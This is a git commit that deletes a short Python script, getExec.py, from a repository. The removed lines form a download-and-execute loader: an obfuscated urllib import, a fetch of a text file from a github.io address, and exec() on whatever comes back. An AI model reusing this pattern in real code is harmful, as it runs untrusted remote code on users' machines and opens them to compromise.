0e633fe4cbe2353fdfaff1ad55fafbf62af1d878
Sl33pyPanda <Sl33pyPanda@users.noreply.github.com>
2020-05-22 00:58:22 +0700

    Delete getExec.py

--- script/getExec.py
+++
@@ -1,4 +0,0 @@
-import sys, base64
-u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',))
-r=u.urlopen("https://sl33pypanda.github.io/mi1stRepo/nescesito.txt")
-exec(r.read())
